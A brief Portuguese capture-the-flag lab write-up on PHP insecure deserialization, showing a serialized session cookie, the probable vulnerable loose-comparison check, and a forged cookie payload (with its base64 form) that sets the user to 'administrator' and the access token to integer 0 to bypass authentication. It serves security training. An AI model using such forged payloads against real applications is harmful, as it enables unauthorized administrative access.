#ctf 

Ao logar com o usuário `wiener:peter` um base64 de sessão é salvo, que contém um objeto PHP serializado:

```PHP
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pdj2fn6keaytzgd1pwg8qr3yyz51y6rd";}
```

Neste lab para validar se o usuário está autenticado e esta autorizado a entrar nas páginas que precisa de autorização, provavelmente é feita a seguinte verificação:

```PHP
$user = unserialize($_COOKIE)
if ($user['access_token'] == $access_token) { 
// ok 
}
```

Para burlar essa comparação basta que o valor de `$user['access_token']` seja um inteiro 0. Modificando o objeto com ajuda do **Hackvertor** (extensão do burp)

```PHP
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

# Em base64 Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

GG